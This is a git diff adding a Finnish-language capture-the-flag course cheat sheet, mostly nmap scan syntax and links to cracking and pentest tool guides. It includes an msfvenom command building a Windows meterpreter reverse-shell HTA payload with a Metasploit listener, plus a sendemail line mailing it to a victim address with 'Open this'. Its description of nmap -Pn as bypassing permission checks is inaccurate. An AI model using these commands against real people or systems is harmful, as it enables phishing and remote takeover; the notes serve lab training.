@@ -4,6 +4,69 @@ Lipunryöstö lähestyy, ja samalla kurssin päätös. Nyt valmistaudutaan lipun
 
 # a) Cheatsheet. Kerää parhaat komennot lipunryöstöä varten.
 
+nmap : https://www.stationx.net/nmap-cheat-sheet/
+
+    Yksinkertainen skannaus yhdelle IP-osoitteelle:
+    nmap <IP-osoite>
+
+    Skannaus useille IP-osoitteille:
+    nmap <IP-osoite1> <IP-osoite2> <IP-osoite3> ...
+    
+    Skannaus IP-osoitealueelle:
+    nmap <alkuosoite>-<loppuosoite>
+    Esimerkiksi: nmap 192.168.1.1-254
+
+    Skannaus käyttäen CIDR-notaatiota:
+    nmap <verkkopolkun-IP>/<maski-bittien-määrä>
+    Esimerkiksi: nmap 192.168.1.0/24
+
+    Skannaus yhdestä tai useammasta IP-osoitteesta, jotka on lueteltu tiedostossa:
+    nmap -iL <tiedoston-nimi>
+
+    Skannaus yhdestä tai useammasta satunnaisesti valitusta IP-osoitteesta:
+    nmap -iR <lukumäärä>
+    Esimerkiksi: nmap -iR 100
+
+    Skannaus tietyn palvelimen kaikkia IP-osoitteita:
+    nmap <verkkotunnus>
+    Esimerkiksi: nmap google.fi
+
+Skannauksen tekeminen, joka ohittaa käyttöoikeuden tarkistukset ja on nopeampi:
+nmap -Pn <IP-osoite>
+
+
+sql injektio: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+fuff: https://cheatsheet.haax.fr/web-pentest/tools/ffuf/
+
+Jhon the ripper: https://www.stationx.net/how-to-use-john-the-ripper/
+
+hashcat: https://denizhalil.com/2023/11/01/hashcat-password-cracking/
+
+kerberos: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+
+msfvenom/metasploitable : https://www.comparitech.com/net-admin/metasploit-cheat-sheet/
+
+msfconsole
+use multi/handler/payload
+SET payload 
+SET LHOST 
+SET LPORT 
+run -j
+
+msfvenom -p windows/meterpreter/reverse_http -f hta-psh -o payload.hta LHOST=192.168.22.2 LPORT=80
+
+sendemail -s 192.168.22.150 -f bob@example.com -t larry.dyson@ecorp.com -u Hello -m "Open this" -a payload.hta
+
+sessions -i 1
+
+
+pencode
+
+zap
+
+
+
 
 # b) Review. Etsi ja tiivistä vertaisarviotu katsausartikkeli valitsemaltasi kyberturvallisuuden tai hakkeroinnin alalta.
 "review" - yleensä katsausartikkeli nimessä on sana "review". Se pyrkii antamaan käsityksen alan tutkimuksesta juuri tällä hetkellä. Scholarlissa on myös nappi, jolla se yrittää näyttää vain review-artikkelit.
